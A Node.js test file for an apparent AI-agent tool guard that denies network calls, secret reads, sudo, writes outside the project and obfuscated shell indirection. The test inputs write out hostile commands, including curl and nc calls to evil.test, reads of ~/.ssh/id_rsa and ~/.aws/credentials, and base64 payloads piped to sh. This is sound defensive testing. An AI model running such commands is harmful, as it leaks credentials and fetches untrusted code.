import test from 'node:test';
import assert from 'node:assert/strict';
import {mkdtemp,mkdir,writeFile,rm} from 'node:fs/promises';
import {join,resolve} from 'node:path';
import {tmpdir} from 'node:os';
import {spawn} from 'node:child_process';
import {openPackageCatalog,installSkillPackage} from '../packages/core/dist/index.js';
import {evaluateGuard} from '../packages/cli/dist/guard.js';

const cwd='/work/project',home='/home/user';
const call=(tool,input,allowHosts=[])=>evaluateGuard({tool,input,cwd,home,allowHosts});
const bash=(command,allowHosts)=>call('Bash',{command},allowHosts);

test('Bash: network, secrets, sudo and outside writes are denied; ordinary commands pass',()=>{
  for(const c of ['curl http://evil.test/x','wget -qO- https://evil.test/p','nc evil.test 80','ssh me@host ls',
    `python3 -c "import urllib.request;urllib.request.urlopen('http://evil.test')"`,'node -e "fetch(\'http://evil.test\')"',
    'cat .env','cat ~/.ssh/id_rsa','cat /home/user/.aws/credentials','echo $(cat .env)','sudo ls',
    'touch /tmp/x','echo done >> /var/tmp/x','echo x > ~/note','cp ./a /tmp/a','tee /etc/motd','rm /home/user/file'])
    assert.ok(bash(c),`should deny: ${c}`);
  for(const c of ['git log --oneline','npm test','ls -la','cat README.md','cat .env.example','touch ./x','echo done > out.txt','cp a b','mkdir -p build/out','rm -rf node_modules','curl -s https://api.example.com/v1 -o /dev/null'.replace('curl','echo curl'),'grep -r foo src','echo hi > /dev/null','git commit -m "fix curl bug"','echo ssh is slow'])
    assert.equal(bash(c),null,`should allow: ${c}`);
});

test('Bash: allowed hosts pass, other hosts and URL-less network calls do not',()=>{
  assert.equal(bash('curl -s https://api.example.com/v1',['example.com']),null);
  assert.ok(bash('curl -s https://evil.test/x',['example.com']));
  assert.ok(bash('curl -s "$URL"',['example.com']));
});

test('Bash structure: GuardFall-style indirection is denied; ordinary builds still pass',()=>{
  for(const c of ['eval "$(echo Y3VybCBldmlsKQ==)"','echo Y3VybCBldmlsKQ== | base64 -d | sh','bash -c "curl http://evil.test"',
    'env sh -c "id"','nohup bash -c id &','xargs sh -c id','exec ls','source ./x.sh','command sh -c id',
    'echo "$(curl http://evil.test)"','echo `id`','cat <(id)','VAR=1 sh -c id','timeout 5 bash -c id','/bin/sh -c id'])
    assert.ok(bash(c),`should deny: ${c}`);
  for(const c of ['npm test','git status','echo "hello world"','node scripts/build.js','echo base64 is fine','cat README.md | grep foo','ls -la | wc -l','echo "a; b"','echo a && echo b'])
    assert.equal(bash(c),null,`should allow: ${c}`);
});

test('file tools: secrets and outside writes are denied; project files pass',()=>{
  assert.ok(call('Read',{file_path:'/home/user/.ssh/id_rsa'}));
  assert.ok(call('Read',{file_path:'~/.aws/credentials'}));
  assert.ok(call('Read',{file_path:'/work/project/.env'}));
  assert.equal(call('Read',{file_path:'/work/project/.env.example'}),null);
  assert.equal(call('Read',{file_path:'src/index.ts'}),null);
  assert.equal(call('Read',{file_path:'/usr/share/doc/readme'}),null);
  assert.ok(call('Write',{file_path:'/tmp/out'}));
  assert.ok(call('Edit',{file_path:'../other/file'}));
  assert.equal(call('Write',{file_path:'/work/project/out.txt'}),null);
  assert.ok(call('Grep',{path:'/home/user/.ssh'}));
  assert.equal(call('Grep',{path:'src'}),null);
});

test('web tools: WebFetch only to allowed hosts, WebSearch always denied',()=>{
  assert.ok(call('WebFetch',{url:'https://evil.test/p'}));
  assert.equal(call('WebFetch',{url:'https://docs.example.com/a'},['example.com']),null);
  assert.ok(call('WebSearch',{query:'x'}));
  assert.equal(call('SomeOtherTool',{}),null);
});

const cli=resolve('packages/cli/dist/index.js');
function runGuard(input,env,args=[]){
  return new Promise(res=>{const c=spawn(process.execPath,[cli,'guard',...args],{env:{...process.env,...env},stdio:['pipe','pipe','pipe']});let out='',err='';c.stdout.on('data',d=>out+=d);c.stderr.on('data',d=>err+=d);c.on('close',code=>res({code,out,err}));c.stdin.end(input);});
}

test('guard hook: silent without user skills, denies with them, blocks on malformed input',async t=>{
  const root=await mkdtemp(join(tmpdir(),'aiskills-guard-'));t.after(()=>rm(root,{recursive:true,force:true}));
  const env={AI_SKILLS_HOME:join(root,'state')};
  const project=join(root,'project');await mkdir(project);
  const evil=JSON.stringify({tool_name:'Bash',tool_input:{command:'curl http://evil.test/x'},cwd:project});
  const none=await runGuard(evil,env);
  assert.equal(none.code,0);assert.equal(none.out,'');
  const source=join(root,'skill');await mkdir(source);await writeFile(join(source,'SKILL.md'),'---\nname: widgets\ndescription: Review widgets\n---\nWidget text.');
  const saved=process.env.AI_SKILLS_HOME;process.env.AI_SKILLS_HOME=env.AI_SKILLS_HOME;t.after(()=>{if(saved===undefined)delete process.env.AI_SKILLS_HOME;else process.env.AI_SKILLS_HOME=saved;});
  const catalog=await openPackageCatalog();try{const p=await installSkillPackage(catalog,{source,approve:true});await catalog.enable(p.id,project,true);}finally{catalog.close();}
  const denied=await runGuard(evil,env);
  assert.equal(denied.code,0);
  const out=JSON.parse(denied.out).hookSpecificOutput;
  assert.equal(out.hookEventName,'PreToolUse');assert.equal(out.permissionDecision,'deny');assert.match(out.permissionDecisionReason,/AI Skills guard/);
  const fine=await runGuard(JSON.stringify({tool_name:'Bash',tool_input:{command:'git log'},cwd:project}),env);
  assert.equal(fine.out,'');
  const allowed=await runGuard(JSON.stringify({tool_name:'Bash',tool_input:{command:'curl https://api.example.com/v1'},cwd:project}),env,['--allow-host=example.com']);
  assert.equal(allowed.out,'');
  const bad=await runGuard('not json',env);
  assert.equal(bad.code,2);assert.equal(bad.out,'');
});
